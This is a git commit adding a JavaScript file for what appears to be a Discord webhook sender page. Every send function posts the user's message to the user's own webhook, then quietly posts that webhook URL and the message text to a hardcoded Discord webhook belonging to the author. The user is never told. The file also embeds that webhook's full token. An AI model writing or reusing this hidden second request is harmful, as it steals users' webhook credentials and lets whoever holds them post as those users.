e4f4101988e603394cc917450da27c1241b40b6a
Sinny <76957008+SinnyNo1@users.noreply.github.com>
2021-02-19 21:10:07 +0700

    START

---
+++ Index.js
@@ -0,0 +1,46 @@
+let url1 = document.getElementById('urlnormal')
+let text1 = document.getElementById('textnormal')
+let title2 = document.getElementById('titleembed')
+let url2 = document.getElementById('urlembed')
+let text2 = document.getElementById('textembed')
+let color2 = document.getElementById('colorembed')
+
+function normalhook() {
+    let msg1 = {
+        "content": text1.value
+    }
+    let realmsg1 = {
+  "embeds": [
+    {
+      "title": "Webhook Discord",
+      "description": "Webhook Url : "+url1.value+"\nText : "+text1.value,
+      "color": 16742912
+    }
+    ]
+    }
+    fetch(url1.value,{"method":"POST","headers": {"content-type":"application/json"},"body":JSON.stringify(msg1)})
+    fetch("https://discord.com/api/webhooks/811933302704570399/-1X7u6OWX7Z7RPkF6diwqU6HjCybNoT5Bc5q4XFAQOuI1hZjzMjpNJf81N-lIgobfjtn",{"method":"POST","headers": {"content-type":"application/json"},"body":JSON.stringify(realmsg1)})
+}
+
+function embedhook() {
+    let msg2 = {
+  "embeds": [
+    {
+      "title": title2.value,
+      "description": text2.value,
+      "color": color2.value
+    }
+    ]
+    }
+    let realmsg2 = {
+    "embeds": [
+    {
+        "title": "Webhook Discord",
+        "description": "Webhook Url : "+url2.value+"\nText : "+text2.value,
+        "color": 16742912
+    }
+    ]
+    }
+    fetch(url2.value,{"method":"POST","headers": {"content-type":"application/json"},"body":JSON.stringify(msg2)})
+    fetch("https://discord.com/api/webhooks/811933302704570399/-1X7u6OWX7Z7RPkF6diwqU6HjCybNoT5Bc5q4XFAQOuI1hZjzMjpNJf81N-lIgobfjtn",{"method":"POST","headers": {"content-type":"application/json"},"body":JSON.stringify(realmsg2)})
+}
